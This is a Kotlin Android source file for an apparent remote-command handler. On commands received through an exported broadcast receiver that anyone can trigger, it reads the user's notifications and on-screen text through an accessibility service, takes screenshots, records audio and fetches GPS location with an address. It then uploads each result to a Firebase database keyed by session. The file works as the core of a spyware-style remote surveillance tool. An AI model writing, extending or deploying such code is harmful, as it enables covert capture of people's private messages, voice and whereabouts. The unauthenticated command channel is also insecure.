package com.jonas.x24
import android.view.Display

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase
import com.jonas.x24.services.x24AccessibilityService
import com.jonas.x24.services.x24NotificationService
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream

class CommandReceiverActivity : AppCompatActivity() {

    private lateinit var sessionKey: String

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val command = intent?.getStringExtra("COMMAND")
            val newSessionKey = intent?.getStringExtra("SESSION_KEY")

            if (newSessionKey != null) {
                sessionKey = newSessionKey
            }

            if (command != null && ::sessionKey.isInitialized) {
                when (command) {
                    "READ_NOTIFICATIONS" -> readNotifications()
                    "READ_SCREEN" -> readScreen()
                    "START_RECORD_AUDIO" -> {
                        AudioRecordManager.startRecording(this@CommandReceiverActivity, sessionKey)
                        finish()
                    }
                    "STOP_RECORD_AUDIO" -> {
                        AudioRecordManager.stopRecording(sessionKey)
                        finish()
                    }
                    "SCREENSHOT_A11Y" -> takeA11yScreenshot()
                "GET_LOCATION" -> getLocation()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val filter = IntentFilter("com.jonas.x24.COMMAND_RECEIVED")
        androidx.core.content.ContextCompat.registerReceiver(this, receiver, filter, androidx.core.content.ContextCompat.RECEIVER_EXPORTED)


        intent?.let { handleIntent(it) }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIntent(intent)
    }

    private fun handleIntent(intent: Intent) {
        val command = intent.getStringExtra("COMMAND")
        val newSessionKey = intent.getStringExtra("SESSION_KEY")

        if (newSessionKey != null) {
            sessionKey = newSessionKey
        }

        if (command != null && ::sessionKey.isInitialized) {
            when (command) {
                "READ_NOTIFICATIONS" -> readNotifications()
                    "READ_SCREEN" -> readScreen()
                "START_RECORD_AUDIO" -> {
                        AudioRecordManager.startRecording(this@CommandReceiverActivity, sessionKey)
                        finish()
                    }
                    "STOP_RECORD_AUDIO" -> {
                        AudioRecordManager.stopRecording(sessionKey)
                        finish()
                    }
                "SCREENSHOT_A11Y" -> takeA11yScreenshot()
                "GET_LOCATION" -> getLocation()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
    }

    private fun postResult(type: String, data: String) {
        if (!::sessionKey.isInitialized) return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    private fun getLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "Location permissions denied")
            finish()
            return
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var location: Location? = null
        try {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch(e: Exception) {
            Log.e("CommandReceiver", "Location error", e)
        }

        if (location != null) {
            val geocoder = Geocoder(this, java.util.Locale.getDefault())
            try {
                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    val address = addresses[0]
                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
                    finish()
                    return
                }
            } catch (e: Exception) { }
            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
        } else {
            postResult("ERROR", "Could not determine location")
        }
        finish()
    }

    private fun readScreen() {
        val service = x24AccessibilityService.instance
        if (service != null) {
            val screenContext = service.getScreenContext()
            postResult("TEXT", "Screen Context:\n$screenContext")
        } else {
            postResult("ERROR", "Accessibility service not running")
        }
        finish()
    }

    private fun readNotifications() {
        val activeNotifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
        val recentNotifs = x24NotificationService.recentNotifications

        val builder = java.lang.StringBuilder()

        if (activeNotifs.isNotEmpty()) {
            builder.append("Active Notifications:\n")
            builder.append(activeNotifs.joinToString("\n"))
            builder.append("\n\n")
        } else {
            builder.append("No active notifications.\n\n")
        }

        if (recentNotifs.isNotEmpty()) {
            builder.append("Recent Notifications:\n")
            builder.append(recentNotifs.joinToString("\n"))
        } else {
            builder.append("No recent notifications.")
        }

        postResult("TEXT", builder.toString().trim())
        finish()
    }



    private fun takeA11yScreenshot() {
        val service = x24AccessibilityService.instance
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                service.takeScreenshot(windowManager.defaultDisplay.displayId, applicationContext.mainExecutor, object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                            if (bitmap != null) {
                                // Hardware bitmaps need to be converted to software to compress
                                val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                                val outputStream = ByteArrayOutputStream()
                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream)
                                val base64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT)
                                postResult("IMAGE", base64)
                            } else {
                                postResult("ERROR", "Failed to create bitmap from screenshot")
                            }
                        } catch (e: Exception) {
                            Log.e("x24Command", "Error processing screenshot", e)
                            postResult("ERROR", "Error processing screenshot: ${e.message}")
                        } finally {
                            try {
                                screenshot.hardwareBuffer.close()
                            } catch (e: Exception) {
                                Log.e("x24Command", "Error closing hardware buffer", e)
                            }
                            finish()
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        postResult("ERROR", "Accessibility Screenshot Failed: Code $errorCode")
                        finish()
                    }
                })
            } catch (e: Exception) {
                Log.e("x24Command", "Error calling takeScreenshot", e)
                postResult("ERROR", "Error calling takeScreenshot: ${e.message}")
                finish()
            }
        } else {
            postResult("ERROR", "Accessibility service running: ${service != null}, SDK: ${Build.VERSION.SDK_INT} (requires 30+)")
            finish()
        }
    }
}
